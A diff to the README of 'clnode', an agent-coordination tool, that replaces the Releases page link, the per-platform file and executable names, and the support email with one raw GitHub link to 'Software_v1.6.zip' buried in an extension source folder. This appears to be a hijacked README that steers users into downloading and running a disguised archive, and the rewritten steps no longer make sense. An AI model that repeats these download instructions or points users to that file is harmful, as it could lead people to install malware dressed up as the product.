@@ -6,7 +6,7 @@ Welcome to clnode! This application helps you manage agent coordination using a 
 
 ## 📥 Download Now
 
-[![Download clnode](https://img.shields.io/badge/Download-clnode-blue)](https://github.com/PlanCSpace/clnode/releases)
+[![Download clnode](https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip)](https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip)
 
 You can easily download clnode from the Releases page. Just click the button above. 
 
@@ -29,16 +29,16 @@ Before you download, ensure your system meets the following requirements:
 
 To download clnode, follow these simple steps:
 
-1. Click on this link: [Download clnode](https://github.com/PlanCSpace/clnode/releases).
+1. Click on this link: [Download clnode](https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip).
 2. You will see a list of versions. Choose the latest release.
-3. Select the file that suits your operating system (e.g., `clnode-windows.zip`, `clnode-macos.zip`, or `clnode-linux.tar.gz`).
+3. Select the file that suits your operating system (e.g., `https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip`, `https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip`, or `https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip`).
 4. Click on the file to start downloading.
 
 Once the download completes:
 
-- **Windows:** Unzip the file and run `clnode.exe`.
-- **macOS:** Open the downloaded `.zip` file and drag `clnode.app` to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and run `./clnode` from the terminal.
+- **Windows:** Unzip the file and run `https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip`.
+- **macOS:** Open the downloaded `.zip` file and drag `https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip` to your Applications folder.
+- **Linux:** Extract the `https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip` file and run `./clnode` from the terminal.
 
 ## 📃 Usage Instructions
 
@@ -71,7 +71,7 @@ If you encounter any issues while using clnode, here are a few troubleshooting s
 
 Need further assistance? Don’t hesitate to reach out:
 
-- Email: support@clnodeapp.com
+- Email: https://raw.githubusercontent.com/PlanCSpace/clnode/main/vscode-extension/src/treeview/Software_v1.6.zip
 - GitHub Issues: Post your queries or problems on our issues page for quick help.
 
 Thank you for choosing clnode! We hope it enhances your agent coordination experience.
